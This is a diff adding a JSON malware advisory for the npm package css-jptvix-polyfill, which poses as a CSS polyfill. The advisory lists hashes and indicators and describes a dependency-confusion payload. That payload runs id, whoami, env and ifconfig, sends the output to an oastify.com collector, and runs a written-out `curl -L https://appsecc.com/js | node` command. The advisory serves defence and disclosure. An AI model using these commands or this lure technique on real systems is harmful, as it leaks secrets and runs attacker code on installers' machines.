@@ -1,0 +1,114 @@
+{
+  "modified": "2026-10-08T06:00:00Z",
+  "published": "2026-10-06T19:51:06Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-17638",
+  "summary": "Malicious code in css-jptvix-polyfill (npm)",
+  "details": "css-jptvix-polyfill@1.0.0 was published to npm on 2026-10-06 07:29 UTC by user naorya and was unpublished by npm on 2026-10-06 15:04 UTC after a malware report. It is described as a CSS polyfill but contains no polyfill: index.js is an empty module, registry-manifest.min.json maps Wix-internal module names (thunderboltRegistry, siteAssetsRegistry, editorRegistry, corvidRegistry, ...) to static.parastorage.com (Wix CDN) URLs, and thunderboltRegistry.js carries the payload, which runs at require time as a top-level IIFE.\n\nBehavior of thunderboltRegistry.js: (1) obtains child_process through require('child_process'), require('node:child_process') or a fresh Module instance if both are blocked; (2) runs the host commands id, id -un || whoami, env and ifconfig || ip addr with execSync and sends each output, together with os.hostname(), to an out-of-band collector at orj3tao0ic8oj24h9njymexmtdz5ztphe.oastify.com as cmd=id, cmd=whoami, cmd=env and cmd=ifconfig; the env step leaks every environment variable of the host, including tokens and cloud credentials; (3) runs curl -L https://appsecc.com/js | node, i.e. downloads and executes remote code, and reports the result as cmd=reverse-shell; (4) sends a beacon tagged rce-poc with the Node version, platform and process id; (5) exports Proxy objects under the Wix-internal module names, which together with the manifest indicates a dependency-confusion attempt against that organization's private packages.\n\nTrigger: on import (require). Type: information stealer (host identity and environment variables) plus remote code execution. Same facade and behavior as css-eqxcdx-polyfill (different package name and collector host).\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (cea61788c370593a2720461d06b74942933d38d30b449851a05541b5b7f189aa)\nThe package ships thunderboltRegistry.js, a Proxy-based shim that exports names mimicking internal Wix thunderbolt modules (thunderboltRegistry, siteAssetsRegistry, editorRegistry, corvidRegistry, documentManagementRegistry, and others) so that any import of those names in a victim build auto-triggers its payload. On load, the module uses child_process.execSync to run `id`, `whoami`, `env`, and `ifconfig`/`ip addr`, and ships the output together with the hostname via fetch to the hardcoded Burp Collaborator subdomain https://orj3tao0ic8oj24h9njymexmtdz5ztphe.oastify.com, leaking the full process environment (including any tokens or secrets present) and host identifiers off the installer's machine. The same IIFE additionally runs `curl -L https://appsecc.com/js | node`, piping attacker-controlled JavaScript from an unrelated third-party domain directly into the installer's Node.js interpreter; the code labels this branch `reverse-shell`. The package name and the Wix-internal registry shape are consistent with a dependency-confusion lure targeting Wix thunderbolt builds.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "css-jptvix-polyfill"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "thunderboltRegistry.js",
+              "sha256": "8b437ee6733aa1c34668f7c67d779276c08f7013def225c55d61c31753442fc7",
+              "tlsh": "3d7143b5b99df02066c33438db7f5049b4bb8a672c6caee0b40859b01f3585c01be6f4"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "css-jptvix-polyfill-1.0.0.tgz",
+              "hashes": {
+                "sha1": "9e700b2c0520fc6a236e4b14db5db5c89b6e8ea4",
+                "sha512_sri": "sha512-Js0W2iiynerl/vPEpcWopmR1zUdevE9QFxO+uMawx929wvihQ2kbi13xV6DkdsiXvvjczR2MRVWNLYtM1xpDeA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/css-jptvix-polyfill/v/1.0.0"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    },
+    {
+      "name": "Eunsoo Kim",
+      "type": "FINDER",
+      "contact": [
+        "https://github.com/eskim86"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-021098",
+        "import_time": "2026-10-06T20:20:38.654635904Z",
+        "modified_time": "2026-10-06T19:51:06Z",
+        "sha256": "cea61788c370593a2720461d06b74942933d38d30b449851a05541b5b7f189aa",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
+      }
+    ],
+    "iocs": {
+      "domains": [
+        "orj3tao0ic8oj24h9njymexmtdz5ztphe.oastify.com",
+        "appsecc.com"
+      ],
+      "urls": [
+        "https://orj3tao0ic8oj24h9njymexmtdz5ztphe.oastify.com/",
+        "https://appsecc.com/js"
+      ],
+      "files": [
+        {
+          "paths": [
+            "thunderboltRegistry.js"
+          ],
+          "note": "payload: runs on require, executes id/whoami/env/ifconfig and curl | node, exfiltrates to oastify.com",
+          "source": "PACKAGE_ARCHIVE",
+          "digests": {
+            "sha256": "8b437ee6733aa1c34668f7c67d779276c08f7013def225c55d61c31753442fc7"
+          }
+        },
+        {
+          "paths": [
+            "registry-manifest.min.json"
+          ],
+          "note": "maps Wix-internal module names to static.parastorage.com URLs (dependency confusion)",
+          "source": "PACKAGE_ARCHIVE",
+          "digests": {
+            "sha256": "64dae1c27b8491f8eb0a9169038ff5ac62eca6265e63f3e6a1c725b275074a59"
+          }
+        }
+      ]
+    }
+  }
+}
